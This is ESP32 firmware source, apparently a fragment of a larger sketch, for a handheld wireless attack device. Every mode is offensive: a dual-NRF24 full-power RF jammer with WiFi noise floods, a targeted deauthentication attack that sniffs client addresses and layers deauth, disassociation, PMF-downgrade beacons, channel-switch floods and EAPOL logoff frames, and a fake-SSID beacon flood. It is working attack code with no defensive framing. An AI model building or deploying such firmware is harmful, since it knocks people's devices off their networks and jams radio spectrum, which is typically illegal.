void updateLEDs(){
  static unsigned long lb=0; static bool bs=false;
  bool active=(appState==STATE_DEAUTH_ATTACK||appState==STATE_BEACON);
  if(active&&millis()-lb>200){
    bs=!bs; lb=millis();
    digitalWrite(deauthLedPin,bs?HIGH:LOW);
  }
  if(!active){digitalWrite(deauthLedPin,LOW);}
}

// ============ BUTTON HANDLERS ============
void handleScroll(){
  switch(appState){
    case STATE_MENU: currentMode=(currentMode+1)%MODE_COUNT; break;
    case STATE_DEAUTH_LIST: selectedNetwork=(selectedNetwork+1)%(networkCount+2); break;
    default: stopCurrentMode(); break;
  }
}
void handleSelect(){
  switch(appState){
    case STATE_MENU:
      if(currentMode==MODE_RF_JAM){isJamming=true; startJamming(); appState=STATE_RF_JAM;}
      else if(currentMode==MODE_DEAUTH){
        if(!scanExecuted){appState=STATE_DEAUTH_SCAN; updateDisplay(); startWiFiScan();}
        selectedNetwork=0; appState=STATE_DEAUTH_LIST;
      }
      else if(currentMode==MODE_BEACON){startBeaconFlood(); appState=STATE_BEACON;}
      break;
    case STATE_DEAUTH_LIST:
      if(selectedNetwork<networkCount){startDeauth(selectedNetwork); appState=STATE_DEAUTH_ATTACK;}
      else if(selectedNetwork==networkCount){appState=STATE_DEAUTH_SCAN; updateDisplay(); startWiFiScan(); selectedNetwork=0; appState=STATE_DEAUTH_LIST;}
      else{appState=STATE_MENU;}
      break;
    default: stopCurrentMode(); break;
  }
}
void stopCurrentMode(){
  if(appState==STATE_RF_JAM){isJamming=false; stopJamming(); appState=STATE_MENU;}
  else if(appState==STATE_DEAUTH_ATTACK){stopDeauth(); appState=(networkCount>0)?STATE_DEAUTH_LIST:STATE_MENU; deauthCycles=0;}
  else if(appState==STATE_BEACON){stopBeaconFlood(); appState=STATE_MENU;}
  digitalWrite(rfLedPin,LOW); digitalWrite(deauthLedPin,LOW);
}

void checkButtons(){
  static int l4=HIGH,l5=HIGH;
  static unsigned long t4=0,t5=0;
  int b4=digitalRead(btnScrollPin);
  int b5=digitalRead(btnSelectPin);
  unsigned long now=millis();
  if(b4==LOW&&l4==HIGH&&(now-t4)>300){
    delay(10);
    if(digitalRead(btnScrollPin)==LOW){t4=now; handleScroll();}
  }
  if(b5==LOW&&l5==HIGH&&(now-t5)>300&&(now-t4)>150){
    delay(10);
    if(digitalRead(btnSelectPin)==LOW){t5=now; handleSelect();}
  }
  l4=b4; l5=b5;
}

// ============ MAX POWER RF JAM v2 ============
void startJamming(){
  Serial.println("\n>>> MAX POWER RF JAM v2 ON (multi-source)");
  digitalWrite(rfLedPin,HIGH);
  btStop(); delay(50);
  // AP_STA mode = both WiFi interfaces up for noise broadcast
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_max_tx_power(84);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_protocol(WIFI_IF_AP,WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
  esp_wifi_set_protocol(WIFI_IF_STA,WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
  // Pre-init broadcast deauth packet (reason 7 = Class 3 frame from non-associated STA)
  bcastDeauth[0]=0xC0; bcastDeauth[1]=0; bcastDeauth[2]=0x3A; bcastDeauth[3]=1;
  memset(&bcastDeauth[4],0xFF,6);  // dst = broadcast
  memset(&bcastDeauth[10],0xFF,6); // src = broadcast
  memset(&bcastDeauth[16],0xFF,6); // bssid = broadcast
  bcastDeauth[22]=0; bcastDeauth[23]=0;
  bcastDeauth[24]=7; bcastDeauth[25]=0;  // reason 7
  // Pre-fill noise packet
  for(int i=0;i<128;i++)noisePkt[i]=esp_random()%256;
  // Both NRF24 radios at PA_MAX const carrier
  radio.powerUp(); radio1.powerUp(); initRF24Configs();
  radio.startConstCarrier(RF24_PA_MAX,ch);
  radio1.startConstCarrier(RF24_PA_MAX,ch1);
}
void aggressiveRandomMode(){
  // Both radios SYNCED on same channel (2x power per frequency)
  uint8_t randCh=random(2,80);
  radio1.setChannel(randCh);
  radio.setChannel(randCh);
  // Refresh random bytes for noise packets (varied each hop)
  for(int i=4;i<128;i++)noisePkt[i]=esp_random()%256;
  // 3x noise broadcasts on AP interface (128 bytes each)
  esp_wifi_80211_tx(WIFI_IF_AP,noisePkt,128,false);
  esp_wifi_80211_tx(WIFI_IF_AP,noisePkt,128,false);
  esp_wifi_80211_tx(WIFI_IF_AP,noisePkt,128,false);
  // 3x noise broadcasts on STA interface (double WiFi interference)
  esp_wifi_80211_tx(WIFI_IF_STA,noisePkt,128,false);
  esp_wifi_80211_tx(WIFI_IF_STA,noisePkt,128,false);
  esp_wifi_80211_tx(WIFI_IF_STA,noisePkt,128,false);
  // 1x broadcast deauth frame (kills WiFi clients on this channel)
  esp_wifi_80211_tx(WIFI_IF_AP,bcastDeauth,26,false);
  esp_wifi_80211_tx(WIFI_IF_STA,bcastDeauth,26,false);
}
void stopJamming(){
  Serial.println("\n>>> RF JAM OFF");
  digitalWrite(rfLedPin,LOW);
  radio.powerDown(); radio1.powerDown(); delay(750);
  WiFi.mode(WIFI_AP); delay(150);
  WiFi.softAP(apSSID,apPassword,1,0,4); delay(150);
  esp_wifi_set_protocol(WIFI_IF_AP,WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
  esp_wifi_set_max_tx_power(84);
  esp_wifi_set_ps(WIFI_PS_NONE);
  Serial.println("WiFi Re-enabled.");
}

// ============ SNIFFER ============
void snifferCallback(void*buf,wifi_promiscuous_pkt_type_t type){
  if(type!=WIFI_PKT_MGMT&&type!=WIFI_PKT_DATA)return;
  uint8_t*p=((wifi_promiscuous_pkt_t*)buf)->payload;
  uint8_t*src=p+10,*dst=p+4,*bssid=p+16;
  uint8_t*cM=nullptr,*aM=nullptr;
  if(memcmp(src,bssid,6)==0){cM=dst; aM=bssid;}
  else if(memcmp(dst,bssid,6)==0){cM=src; aM=bssid;}
  if(cM&&aM){
    if(cM[0]==0xFF&&cM[1]==0xFF)return;
    if(cM[0]==0x33&&cM[1]==0x33)return;
    bool ex=false;
    for(int i=0;i<globalSniffedCount;i++)
      if(memcmp(globalSniffedClients[i].client,cM,6)==0){ex=true; break;}
    if(!ex&&globalSniffedCount<50){
      memcpy(globalSniffedClients[globalSniffedCount].client,cM,6);
      memcpy(globalSniffedClients[globalSniffedCount].bssid,aM,6);
      globalSniffedCount++;
    }
    if(isDeauthing&&memcmp(aM,targetBSSID,6)==0){
      bool e2=false;
      for(int i=0;i<capturedClientCount;i++)
        if(memcmp(capturedClients[i],cM,6)==0){e2=true; break;}
      if(!e2&&capturedClientCount<20){
        memcpy(capturedClients[capturedClientCount],cM,6);
        capturedClientCount++;
      }
    }
  }
}

// ============ WIFI SCAN ============
void startWiFiScan(){
  Serial.println("[*] Scanning...");
  WiFi.mode(WIFI_AP_STA); WiFi.disconnect(true); delay(100);
  globalSniffedCount=0;
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  networkCount=WiFi.scanNetworks(false,true);
  esp_wifi_set_promiscuous(false); delay(50);
  WiFi.mode(WIFI_AP); delay(50);
  if(networkCount>0){
    for(int i=0;i<networkCount&&i<20;i++){
      scannedNetworks[i].ssid=WiFi.SSID(i);
      memcpy(scannedNetworks[i].bssid,WiFi.BSSID(i),6);
      scannedNetworks[i].channel=WiFi.channel(i);
      scannedNetworks[i].rssi=WiFi.RSSI(i);
      scannedNetworks[i].encType=WiFi.encryptionType(i);
    }
  }
  scanExecuted=true;
  Serial.printf("[*] Done: %d networks\n",networkCount);
}

// ============ DEAUTH ============
void startDeauth(int index){
  if(index<0||index>=networkCount)return;
  memcpy(targetBSSID,scannedNetworks[index].bssid,6);
  targetChannel=scannedNetworks[index].channel;
  targetSSID=scannedNetworks[index].ssid;
  targetEncType=scannedNetworks[index].encType;
  targetPMFRequired=isPMFRequired(targetEncType);
  WiFi.mode(WIFI_AP_STA); delay(100);
  esp_wifi_set_max_tx_power(84);
  esp_wifi_set_ps(WIFI_PS_NONE);
  esp_wifi_set_channel(targetChannel,WIFI_SECOND_CHAN_NONE); delay(50);
  esp_wifi_set_protocol(WIFI_IF_AP,WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
  esp_wifi_set_protocol(WIFI_IF_STA,WIFI_PROTOCOL_11B|WIFI_PROTOCOL_11G|WIFI_PROTOCOL_11N);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  seqNum=0; capturedClientCount=0; deauthCycles=0;
  Serial.printf("[*] DEAUTH: %s Ch:%d\n",targetSSID.c_str(),targetChannel);
  isDeauthing=true;
}
void stopDeauth(){
  isDeauthing=false; targetSSID="";
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_AP); delay(100);
  Serial.println("[*] Deauth Stopped");
}

void sendPMFDowngradeBeacon(){
  uint8_t p[128]; p[0]=0x80; p[1]=0; p[2]=0; p[3]=0; memset(&p[4],0xFF,6);
  memcpy(&p[10],targetBSSID,6); memcpy(&p[16],targetBSSID,6);
  uint16_t sc=(seqNum&0x0FFF)<<4; p[22]=sc&0xFF; p[23]=(sc>>8)&0xFF; seqNum=(seqNum+1)&0x0FFF;
  uint64_t ts=esp_timer_get_time(); memcpy(&p[24],&ts,8);
  p[32]=0x64; p[33]=0; p[34]=0x31; p[35]=0x04; int o=36;
  p[o++]=0; p[o++]=0; p[o++]=0x30; p[o++]=0x14; p[o++]=1; p[o++]=0;
  p[o++]=0; p[o++]=0; p[o++]=0x0F; p[o++]=0xAC; p[o++]=4; p[o++]=1; p[o++]=0;
  p[o++]=0; p[o++]=0; p[o++]=0x0F; p[o++]=0xAC; p[o++]=4; p[o++]=1; p[o++]=0;
  p[o++]=0; p[o++]=0; p[o++]=0x0F; p[o++]=0xAC; p[o++]=2; p[o++]=0; p[o++]=0;
  for(int i=0;i<3;i++){
    esp_wifi_80211_tx(WIFI_IF_AP,p,o,false);
    esp_wifi_80211_tx(WIFI_IF_STA,p,o,false);
    responsiveDelay(20);
  }
}
void sendCSABeaconFlood(){
  uint8_t p[80]; p[0]=0x80; p[1]=0; p[2]=0; p[3]=0; memset(&p[4],0xFF,6);
  memcpy(&p[10],targetBSSID,6); memcpy(&p[16],targetBSSID,6);
  int o=24; uint64_t ts=esp_timer_get_time(); memcpy(&p[o],&ts,8); o+=8;
  p[o++]=0x64; p[o++]=0; p[o++]=1; p[o++]=0; p[o++]=0; p[o++]=0; p[o++]=1; p[o++]=1; p[o++]=0x82;
  p[o++]=3; p[o++]=1; p[o++]=targetChannel; p[o++]=0x25; p[o++]=3; p[o++]=1;
  int ci=o; p[o++]=14; p[o++]=0;
  uint8_t ic[]={14,1,14,12,13,1,14,1,12,13};
  for(int i=0;i<10;i++){
    p[ci]=ic[i]; p[ci+1]=0; uint64_t t2=esp_timer_get_time(); memcpy(&p[24],&t2,8);
    uint16_t s2=(seqNum&0x0FFF)<<4; p[22]=s2&0xFF; p[23]=(s2>>8)&0xFF; seqNum=(seqNum+1)&0x0FFF;
    esp_wifi_80211_tx(WIFI_IF_AP,p,o,false); esp_wifi_80211_tx(WIFI_IF_STA,p,o,false);
    responsiveDelay(30);
  }
  for(int c=0;c<capturedClientCount&&c<20;c++){
    memcpy(&p[4],capturedClients[c],6); p[ci]=14; p[ci+1]=0;
    for(int i=0;i<3;i++){
      uint64_t t2=esp_timer_get_time(); memcpy(&p[24],&t2,8);
      uint16_t s2=(seqNum&0x0FFF)<<4; p[22]=s2&0xFF; p[23]=(s2>>8)&0xFF; seqNum=(seqNum+1)&0x0FFF;
      esp_wifi_80211_tx(WIFI_IF_AP,p,o,false);
      responsiveDelay(20);
    }
    memset(&p[4],0xFF,6);
  }
}
void sendCSAActionAttack(){
  const uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t ic[]={255,14,100,165,200,0,13,12};
  uint8_t c[29]; c[0]=0xD0; c[1]=0; c[2]=0x3A; c[3]=1;
  memcpy(&c[4],bc,6); memcpy(&c[10],targetBSSID,6); memcpy(&c[16],targetBSSID,6);
  c[24]=0; c[25]=4; c[26]=1; c[28]=0;
  for(int ch=0;ch<8;ch++){c[27]=ic[ch];
    for(int i=0;i<2;i++){
      uint16_t sc=(seqNum&0x0FFF)<<4; c[22]=sc&0xFF; c[23]=(sc>>8)&0xFF; seqNum=(seqNum+1)&0x0FFF;
      esp_wifi_80211_tx(WIFI_IF_AP,c,29,false); esp_wifi_80211_tx(WIFI_IF_STA,c,29,false);
      responsiveDelay(30);
    }
  }
  for(int c2=0;c2<capturedClientCount&&c2<20;c2++){
    memcpy(&c[4],capturedClients[c2],6); c[27]=255;
    for(int r=0;r<2;r++){
      uint16_t sc=(seqNum&0x0FFF)<<4; c[22]=sc&0xFF; c[23]=(sc>>8)&0xFF; seqNum=(seqNum+1)&0x0FFF;
      esp_wifi_80211_tx(WIFI_IF_AP,c,29,false);
      responsiveDelay(30);
    }
  }
}
void sendEAPOLLogoff(){
  const uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t e[38];
  e[0]=0x08; e[1]=1; e[2]=0x3A; e[3]=1;
  memcpy(&e[4],targetBSSID,6); memcpy(&e[10],bc,6); memcpy(&e[16],targetBSSID,6);
  e[24]=0xAA; e[25]=0xAA; e[26]=3; e[27]=0; e[28]=0; e[29]=0;
  e[30]=0x88; e[31]=0x8E; e[32]=1; e[33]=2; e[34]=0; e[35]=4; e[36]=0; e[37]=0;
  for(int c=0;c<capturedClientCount&&c<20;c++){
    memcpy(&e[10],capturedClients[c],6);
    uint16_t sc=(seqNum&0x0FFF)<<4; e[22]=sc&0xFF; e[23]=(sc>>8)&0xFF; seqNum=(seqNum+1)&0x0FFF;
    for(int r=0;r<2;r++){
      esp_wifi_80211_tx(WIFI_IF_AP,e,38,false); esp_wifi_80211_tx(WIFI_IF_STA,e,38,false);
      responsiveDelay(20);
    }
  }
}
void sendPowerfulDeauth(){
  deauthCycles++;
  uint8_t curCh=0; wifi_second_chan_t sc2; esp_wifi_get_channel(&curCh,&sc2);
  if(curCh!=targetChannel){esp_wifi_set_channel(targetChannel,WIFI_SECOND_CHAN_NONE); responsiveDelay(30);}
  const uint8_t bc[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t r[]={1,2,4,5,6,7}; int nr=6;
  sendPMFDowngradeBeacon(); if(appState!=STATE_DEAUTH_ATTACK)return;
  sendCSABeaconFlood(); if(appState!=STATE_DEAUTH_ATTACK)return;
  if(capturedClientCount>0){
    for(int c=0;c<capturedClientCount&&c<20;c++){
      uint8_t*cm=capturedClients[c];
      for(int i=0;i<10;i++){
        uint8_t d[26]; d[0]=0xC0; d[1]=0; d[2]=0x3A; d[3]=1;
        memcpy(&d[4],cm,6); memcpy(&d[10],targetBSSID,6); memcpy(&d[16],targetBSSID,6);
        uint16_t s=(seqNum&0x0FFF)<<4; d[22]=s&0xFF; d[23]=(s>>8)&0xFF; d[24]=r[i%nr]; d[25]=0; seqNum=(seqNum+1)&0x0FFF;
        esp_wifi_80211_tx(WIFI_IF_AP,d,26,false); esp_wifi_80211_tx(WIFI_IF_STA,d,26,false);
        responsiveDelay(30); if(appState!=STATE_DEAUTH_ATTACK)return;
      }
      for(int i=0;i<10;i++){
        uint8_t d[26]; d[0]=0xA0; d[1]=0; d[2]=0x3A; d[3]=1;
        memcpy(&d[4],cm,6); memcpy(&d[10],targetBSSID,6); memcpy(&d[16],targetBSSID,6);
        uint16_t s=(seqNum&0x0FFF)<<4; d[22]=s&0xFF; d[23]=(s>>8)&0xFF; d[24]=r[(i+3)%nr]; d[25]=0; seqNum=(seqNum+1)&0x0FFF;
        esp_wifi_80211_tx(WIFI_IF_AP,d,26,false);
        responsiveDelay(30); if(appState!=STATE_DEAUTH_ATTACK)return;
      }
    }
  }
  for(int i=0;i<4;i++){
    uint8_t d[26]; d[0]=0xC0; d[1]=0; d[2]=0x3A; d[3]=1;
    memcpy(&d[4],bc,6); memcpy(&d[10],targetBSSID,6); memcpy(&d[16],targetBSSID,6);
    uint16_t s=(seqNum&0x0FFF)<<4; d[22]=s&0xFF; d[23]=(s>>8)&0xFF; d[24]=r[i%nr]; d[25]=0; seqNum=(seqNum+1)&0x0FFF;
    esp_wifi_80211_tx(WIFI_IF_AP,d,26,false); esp_wifi_80211_tx(WIFI_IF_STA,d,26,false);
    responsiveDelay(50); if(appState!=STATE_DEAUTH_ATTACK)return;
  }
  sendCSAActionAttack(); if(appState!=STATE_DEAUTH_ATTACK)return;
  if(capturedClientCount>0)sendEAPOLLogoff(); if(appState!=STATE_DEAUTH_ATTACK)return;
  sendCSABeaconFlood();
}

// ============ BEACON ============
void startBeaconFlood(){
  if(isJamming){isJamming=false; stopJamming();}
  if(isDeauthing)stopDeauth();
  isBeaconing=true; esp_wifi_set_max_tx_power(84); WiFi.mode(WIFI_AP); delay(50);
  esp_wifi_set_promiscuous(true); currentBeaconChannel=1;
}
void stopBeaconFlood(){
  isBeaconing=false; esp_wifi_set_promiscuous(false); WiFi.mode(WIFI_AP); delay(50);
}
void sendBeacon(int channel){
  uint8_t b[6]; for(int i=0;i<6;i++)b[i]=esp_random()%256; b[0]&=0xFE;
  char s[32]; snprintf(s,sizeof(s),"rajdeep_%04d",(esp_random()%9000)+1000); int sl=strlen(s);
  beaconPacket[0]=0x80; beaconPacket[1]=0; beaconPacket[2]=0; beaconPacket[3]=0;
  memset(&beaconPacket[4],0xFF,6); memcpy(&beaconPacket[10],b,6); memcpy(&beaconPacket[16],b,6);
  beaconPacket[22]=esp_random()%256; beaconPacket[23]=(esp_random()%256)&0xF0;
  uint64_t ts=esp_timer_get_time(); memcpy(&beaconPacket[24],&ts,8);
  beaconPacket[32]=0x64; beaconPacket[33]=0; beaconPacket[34]=0x11; beaconPacket[35]=0x04;
  int o=36; beaconPacket[o++]=0; beaconPacket[o++]=sl; memcpy(&beaconPacket[o],s,sl); o+=sl;
  beaconPacket[o++]=1; beaconPacket[o++]=0x0C; beaconPacket[o++]=0x82; beaconPacket[o++]=0x84;
  beaconPacket[o++]=0x8B; beaconPacket[o++]=0x96; beaconPacket[o++]=0x0C; beaconPacket[o++]=0x12;
  beaconPacket[o++]=0x18; beaconPacket[o++]=0x24; beaconPacket[o++]=0x30; beaconPacket[o++]=0x48;
  beaconPacket[o++]=0x60; beaconPacket[o++]=0x6C;
  beaconPacket[o++]=3; beaconPacket[o++]=1; beaconPacket[o++]=channel;
  beaconPacket[o++]=0x2A; beaconPacket[o++]=1; beaconPacket[o++]=0;
  beaconPacket[o++]=0x32; beaconPacket[o++]=4; beaconPacket[o++]=0x6C;
  beaconPacket[o++]=0x6C; beaconPacket[o++]=0x6C; beaconPacket[o++]=0x6C;
  esp_wifi_80211_tx(WIFI_IF_AP,beaconPacket,o,false);
}

// ============ INIT ============
void initRF24Configs(){
  radio.setAutoAck(false); radio.stopListening(); radio.setRetries(0,0);
  radio.setPALevel(RF24_PA_MAX,true); radio.setDataRate(RF24_2MBPS); radio.setCRCLength(RF24_CRC_DISABLED);
  radio1.setAutoAck(false); radio1.stopListening(); radio1.setRetries(0,0);
  radio1.setPALevel(RF24_PA_MAX,true); radio1.setDataRate(RF24_2MBPS); radio1.setCRCLength(RF24_CRC_DISABLED);
}
void initSP(){sp=new SPIClass(VSPI); sp->begin(18,19,23,21); if(radio1.begin(sp)){initRF24Configs(); radio1.powerDown();}}
void initHP(){hp=new SPIClass(HSPI); hp->begin(14,12,13,15); if(radio.begin(hp)){initRF24Configs(); radio.powerDown();}}

void setup(){
  Serial.begin(115200); delay(1000); setCpuFrequencyMhz(240);
  pinMode(btnScrollPin,INPUT_PULLUP); pinMode(btnSelectPin,INPUT_PULLUP);
  pinMode(rfLedPin,OUTPUT); digitalWrite(rfLedPin,LOW);
  pinMode(deauthLedPin,OUTPUT); digitalWrite(deauthLedPin,LOW);
  Wire.begin(25,26); display.begin(SSD1306_SWITCHCAPVCC,0x3C);
  appState=STATE_BOOT; updateDisplay(); delay(2000);
  appState=STATE_MENU; updateDisplay();
  esp_wifi_set_max_tx_power(84); initHP(); initSP();
  WiFi.mode(WIFI_AP);
  WiFi.softAP(apSSID, apPassword, 1, 0, 4);
  Serial.println("[*] V7 Ready - MAX POWER v2");
}

void loop(){
  checkButtons();
  
  if(isBeaconing){
    updateLEDs();
    esp_wifi_set_channel(currentBeaconChannel,WIFI_SECOND_CHAN_NONE);
    for(int i=0;i<30;i++)sendBeacon(currentBeaconChannel);
    currentBeaconChannel++; if(currentBeaconChannel>13)currentBeaconChannel=1; yield();
  }
  else if(isJamming){
    checkButtons();
    aggressiveRandomMode();
  }
  else {
    updateLEDs();
    if(isDeauthing){
      sendPowerfulDeauth(); delay(1); yield();
    }
  }
  
  static unsigned long lastDisp=0;
  if(appState!=STATE_RF_JAM && millis()-lastDisp>200){
    updateDisplay();
    lastDisp=millis();
  }
}
